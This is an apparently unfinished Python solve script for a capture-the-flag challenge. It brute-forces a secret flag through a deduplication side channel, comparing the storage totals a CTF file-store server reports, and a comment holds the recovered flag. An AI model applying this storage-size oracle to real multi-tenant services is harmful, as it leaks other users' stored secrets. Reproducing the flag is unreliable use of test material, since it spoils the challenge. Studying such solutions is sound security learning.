#insecure compression leading to flag discovery via deduplication
import socket
import time
import asyncio
import re
import string

alphabet = string.ascii_uppercase + string.ascii_lowercase + string.digits + '_}'

async def connect():
    try:
        #set up connection and prepare for work
        ncin, ncout = await asyncio.open_connection('filestore.2021.ctfcompetition.com', 1337)
        print('Connection opened.')
        b = await ncin.readuntil(b'- exit\n')
        print(b.decode('utf-8'))    
        
        #do the work
        try_flag2 = '{CR1M3_0f'
        try_flag = '_d3dup1ic4ti0n}'
        # CTF{CR1M3_0f_d3dup1ic4ti0n}
        while True:
            #set starting storage
            ncout.write(b'status\n')
            x = await ncin.readuntil(b'- exit\n')
            x = x.decode('utf-8')
            y = re.search(r'[0-9]+\.[0-9]+kB\/', x).group()
            print('Starting storage: ' + y)
            u = y
            await ncout.drain()
            
            for char in alphabet:
                

                #attempt a flag
                ncout.write(b'store\n')
                await ncin.readline()
                await ncout.drain()
                ncout.write(bytes(try_flag,'utf-8') + bytes(char,'utf-8')+ b'\n')
                g = await ncin.readuntil(b'- exit\n')
                #print(g.decode('utf-8'))
                await ncout.drain()

                #check for a difference
                ncout.write(b'status\n')
                t = await ncin.readuntil(b'- exit\n')
                t = t.decode('utf-8')
                v = re.search(r'[0-9]+\.[0-9]+kB\/', t).group()
                #print('%s' % v)
                
                if v == u:
                    print('most recently selected status is the same as the most recently selected status')
                    print('char: %s' % char)
                    if char != try_flag[-1]:
                       try_flag += char
                       if len(try_flag.encode('utf-8')) == 16:
                           print('rotating %s' % try_flag)
                           raise Exception('Time to Rotate.')
                           #flag += try_flag
                           #try_flag = try_flag[1:]

                else:
                    #print('most recently selected status is not the same as the last selected status')
                    print('v: %s  u: %s  test: %s%s' % (v, u, try_flag, char))
                    u = v

                await ncout.drain()
                
        #manually bail before below until logic good

        #wrap up connection
        #l = await ncin.readuntil(b'- exit\n')
        #print(l.decode('utf-8'))
        ncout.write(b'exit\n')
        await ncout.drain()
        ncout.close()
        await ncout.wait_closed()
        print('Connection closed.')
    except Exception as ex:
        err = "Exception: {0}\nArgs: {1!r}".format(type(ex).__name__, ex.args)
        print(err)
    

def main():
    asyncio.run(connect())


try:
    main()
except Exception:
    print('Done')